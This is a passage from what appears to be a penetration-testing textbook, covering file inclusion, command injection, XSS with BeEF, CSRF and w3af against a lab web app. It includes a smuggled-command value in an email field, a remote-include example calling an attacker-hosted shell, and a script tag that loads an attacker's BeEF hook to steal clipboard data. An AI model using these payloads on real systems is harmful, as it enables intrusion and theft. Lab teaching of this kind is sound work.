### Filesystem Access via Local File Inclusion (LFI)

By manually changing the filename in a request using Burp Proxy, we were able to access other sensitive files. It is evident that the developer did not consider the possibility that a user could request any file, and thus, did not implement proper access controls for files accessible through the newsletters functionality.

Moreover, the scope of this vulnerability extends beyond the web application's files. We can load any file from the filesystem that the IIS_USER has read access to. For example, if you create a file called `secret.txt` on the C: drive, you can access it through the newsletters feature by substituting the desired file in the request within Burp Suite. If we find a way to upload files to the web application, we can even use the LFI vulnerability to execute malicious code on the web server.

### Remote File Inclusion (RFI)

Remote File Inclusion (RFI) vulnerabilities allow attackers to load and execute malicious scripts hosted elsewhere on a vulnerable server. In Chapter 8, we used the open phpMyAdmin interface in XAMPP to write a simple PHP shell and eventually a PHP version of Meterpreter to the web server. Although we are not uploading a file to the server here, the attack mechanism is similar. If we can trick the vulnerable server into executing a remote script, we can run commands on the underlying system.

Our site does not have a remote file inclusion vulnerability, but an example of vulnerable PHP code is provided for illustration. An attacker can host a malicious PHP script (e.g., `meterpreter.php`) on their web server and request the page with the `file` parameter set to `http://example.com/meterpreter.php`. The RFI vulnerability would cause `meterpreter.php` to be executed by the web server, even though it is hosted elsewhere. Our example application is ASP.NET, not PHP, but Msfvenom can create payloads in ASPX format for such applications.

### Command Execution

As noted earlier, the Newsletters folder contains a subfolder named `Mike@Mike.com`. This suggests that the site may contain similar folders for all users signed up to receive newsletters. Some part of the application must be creating these folders as users register or sign up for the newsletter. The application’s code likely runs a command to create these directories. Due to a lack of input validation, we might be able to run additional commands that the developer did not intend.

In Figure 14-18, the bottom right of the web app contains a form to sign up for newsletters. We suspect that when an email address is entered, a folder is created for that email address in the newsletters directory. The email address input is probably fed to a system command to create a directory. If the developer does not properly sanitize user input, we may be able to run additional commands using the ampersand (`&`) symbol.

We will execute a command and send its output to a file in our application’s `C:\inetpub\wwwroot\Book\` directory, then access the file directly to see the command’s output. For example, running the `ipconfig` command on the Windows 7 target and piping the output to `test.txt` in the Book directory:

```
PI:EMAIL & ipconfig > C:\inetpub\wwwroot\Book\test.txt
```

When we browse to `http://192.168.20.12/bookservice/test.txt`, we see the output of our `ipconfig` command, as shown in Figure 14-19.

We are limited to the privileges of the Internet Information Services (IIS) user. On Windows 7 systems, the IIS application runs as a separate account without full system privileges, which is a better security scenario for the developer but more challenging for us.

Though we do not have full access, we can gather a lot of information about the system. For example, we can use the `dir` command to find interesting files or the `netsh advfirewall firewall show rule name=all` command to see the rules in the Windows firewall.

Since we are on a Windows system, we cannot use `wget` from the command line to pull down an interactive shell, but we can use other methods. In Chapter 8, we used TFTP to transfer a shell from our Kali system to the Windows XP target. Windows 7 does not have a TFTP client installed by default, but it does have PowerShell, which we can use for tasks such as downloading and executing a file.

**Note:** A study of PowerShell is outside the scope of this book, but it is very helpful for post-exploitation on the latest Windows operating systems. A good reference can be found [here](http://www.darkoperator.com/powershellbasics/).

### Cross-Site Scripting (XSS)

Perhaps the most common and debated web application security vulnerability is cross-site scripting (XSS). When such vulnerabilities are present, attackers can inject malicious scripts into an otherwise innocuous site to be executed in the user’s browser.

XSS attacks are typically categorized into two types: stored and reflected. Stored XSS attacks are stored on the server and executed whenever a user visits the page where the script is stored. User forums, reviews, and other places where users can save input displayed to other users are ideal for these sorts of attacks. Reflected XSS attacks are not stored on the server but are created by sending requests with the XSS attack itself. The attacks occur when user input is included in the server’s response, such as in error messages or search results.

Reflected XSS attacks rely on a user sending a request with the XSS attack included, often involving some social engineering. Having XSS can increase the success of a social-engineering attack because you can craft a URL that is part of a real, trusted website and use the XSS to redirect the user to a malicious page. Like other attacks, XSS relies on a lack of user input sanitation, allowing us to create and run malicious scripts.

### Checking for a Reflected XSS Vulnerability

We should check any user input for XSS vulnerabilities. Our application has a reflected XSS vulnerability in the search functionality. Try searching for the title `xss` in the Books Search box, as shown in Figure 14-20. The search results page prints the original user input as part of the results. If the user input is not properly sanitized, this may be where we can use XSS.

The typical first XSS test is to attempt to put up a JavaScript alert box. The following code will try to display a JavaScript alert with the text `xss`:

```javascript
<script>alert('xss');</script>
```

If user input is not properly filtered, the script will be executed as part of the search results page. In some cases, the user’s browser will automatically block obvious XSS attacks, and Iceweasel is one such browser. Switch to your Windows 7 target with Internet Explorer. As shown in Figure 14-22, the pop-up alert script executes.

Having determined that reflective XSS is present, we could try to leverage it to attack users. Common attacks include stealing session cookies to send to an attacker-controlled site or embedding a frame to prompt the user for login credentials. A user may think the frame is part of the original page and enter their credentials, which are then sent offsite to the attacker.

### Leveraging XSS with the Browser Exploitation Framework (BeEF)

XSS issues are often overlooked. How much damage can an alert box that says “XSS” do? The Browser Exploitation Framework (BeEF) is a good tool for leveraging XSS issues and uncovering their true attack potential. Using BeEF, we can “hook” a browser by tricking the user into browsing to our BeEF server or using the BeEF JavaScript hook as a payload in the presence of an XSS vulnerability.

Change directories to `/usr/share/beef-xss`, and run `./beef`, as shown in Listing 14-3. This will start the BeEF server, including the web interface and the attack hook.

```bash
root@kali:~# cd /usr/share/beef-xss/
root@kali:/usr/share/beef-xss# ./beef
[11:53:26][*] Bind socket [imapeudora1] listening on [0.0.0.0:2000].
[11:53:26][*] Browser Exploitation Framework (BeEF) 0.4.4.5-alpha
--snip--
[11:53:27][+] running on network interface: 192.168.20.9
[11:53:27] | Hook URL: http://192.168.20.9:3000/hook.js
[11:53:27] |_ UI URL: http://192.168.20.9:3000/ui/panel
[11:53:27][*] RESTful API key: 1c3e8f2c8edd075d09156ee0080fa540a707facf
[11:53:27][*] HTTP Proxy: http://127.0.0.1:6789
[11:53:27][*] BeEF server started (press control+c to stop)
```

Now in Kali, browse to `http://192.168.20.9:3000/ui/panel` to access the BeEF web interface. You should be presented with a login page, as shown in Figure 14-23. The default credentials for BeEF are `beef:beef`. After entering them, you are shown the web interface (Figure 14-24).

Currently, no browsers are hooked in BeEF, so we need to trick someone into loading and running BeEF’s `hook.js` script. Return to our XSS vulnerability in the Book Search box. Instead of using an alert dialog, let’s leverage the issue to load BeEF’s `hook.js` in the target browser. From the Windows 7 Internet Explorer browser, enter `<script src="http://192.168.20.9:3000/hook.js"></script>` into the Book Search box, and click Go. There will be no alert box or other indication to the user, but if you turn back to BeEF, you should see the IP address of the Windows 7 box in the Online Browsers list, as shown in Figure 14-25.

In the details pane, with the IP address of Windows 7 selected in BeEF, you can see details about the hooked browser and the underlying system, such as versions and installed software. At the top of the pane are additional tabs, such as Logs and Commands. Click Commands to see additional BeEF modules you can run against the hooked browser.

For example, navigate to `Browser4Hooked Domain4Create Alert Dialog`. At the right of the screen, you have the option to change the alert text. When finished, click Execute at the bottom right. Turn back to your Windows 7 browser. You should see the pop-up dialog, as shown in Figure 14-27.

Another interesting BeEF command allows you to steal data from the Windows clipboard. On the Windows 7 system, copy some text to the clipboard. Now in BeEF, navigate in the Commands Module Tree to `Host4Get Clipboard`. The text on the clipboard is displayed in the Command Results Pane on the right, as shown in Figure 14-28.

In this section, we have looked at only two simple examples of leveraging a hooked browser with BeEF. There is plenty more we can do. For example, we can use the target browser as a pivot to start gathering information about the local network with ping sweeps or even port scans. You can even integrate BeEF with Metasploit. On your pentests, you can use BeEF as part of social-engineering attacks. If you can find an XSS in your client’s web server, you can improve the results of your campaign by directing users to the company website they trust.

### Cross-Site Request Forgery (CSRF)

Cross-site scripting exploits the trust a user has in a website, whereas a similar vulnerability class called cross-site request forgery (CSRF) exploits a website’s trust in the user’s browser. Consider this scenario: A user is logged in to a banking website and has an active session cookie. The user is also browsing to other websites in other tabs. The user opens a malicious website that contains a frame or image tag that triggers an HTTP request to the banking website with the correct parameters to transfer funds to another account (presumably the attacker’s account). The banking website checks to see that the user is logged in. Finding that the user’s browser has a currently active session, the banking website executes the command in the request, and the attacker steals the user’s money. The user never initiated the transaction—they just had the misfortune of browsing to a malicious website.

### Web Application Scanning with w3af

Automating testing with a tool, particularly for custom applications, is challenging. Nothing compares to a skilled web application tester with a proxy. However, several commercial web application scanners and some free and open-source scanners can automate tasks such as crawling the website and searching for known security issues.

One open-source web application scanner is the Web Application Attack and Audit Framework (w3af). w3af is made up of plugins that perform different web application testing tasks, such as looking for URLs and parameters to test and testing interesting parameters for SQL injection vulnerabilities.

Start w3af as shown here:

```bash
root@kali:~# w3af
```

The w3af GUI will be launched and should look similar to Figure 14-29. On the left of the screen are the scan configuration profiles. By default, you are in an empty profile, which allows you to fully customize which w3af plugins are run against your target. You can also use several preconfigured profiles. For example, the OWASP_Top10 profile will crawl the app with plugins from the discovery section and run plugins from the audit section that look for vulnerabilities from the Open Web Application Security Project (OWASP)’s top ten vulnerability categories. Enter the URL to be scanned, as shown in Figure 14-29, and click Start at the right of the window.

As the scan runs, details will be shown in the Logs tab, and issues discovered will be added to the Results tab (Figure 14-30).

w3af finds the SQL injection vulnerability that we exploited at the start of this chapter, as well as some minor issues worth adding to your pentest report. You can try other w3af profiles or create your own, customizing which plugins are run against the app. w3af can even do a credentialed scan, in which it has an active logged-in session with the app, giving it access to additional functionality to search for issues.

### Summary

In this chapter, we explored common web application vulnerabilities in a sample application built without the necessary input sanitation to mitigate many attacks. Our `bookservice` app has a SQL injection vulnerability in its books details page, allowing us to extract data from the database and even get a system command shell.

We found a similar injection vulnerability in the XML-based login functionality, allowing us to bypass authentication and log in as the first user stored in the `AuthInfo.xml` file. We were also able to use the newsletter page to see the source of arbitrary pages in the web application, including the authentication information, due to a lack of access control and a local file inclusion issue. We were able to run commands on the system by chaining them with the email address to sign up for newsletters and write the output of commands to a file, then access them through the browser. We found an example of reflective XSS in the search functionality, used BeEF to leverage this XSS issue, and gained control of a target browser, giving us a foothold in the system. Finally, we briefly looked at an open-source web vulnerability scanner, w3af.

Web application testing deserves much more discussion than we can devote to it in this book. All the issues covered in this chapter are discussed in detail on OWASP’s website, [https://www.owasp.org/index.php/Main_Page/](https://www.owasp.org/index.php/Main_Page/), which is a good starting point for continuing your study of web application security. OWASP also publishes a vulnerable app, Webgoat, which uses exercises to help you understand and practice these concepts.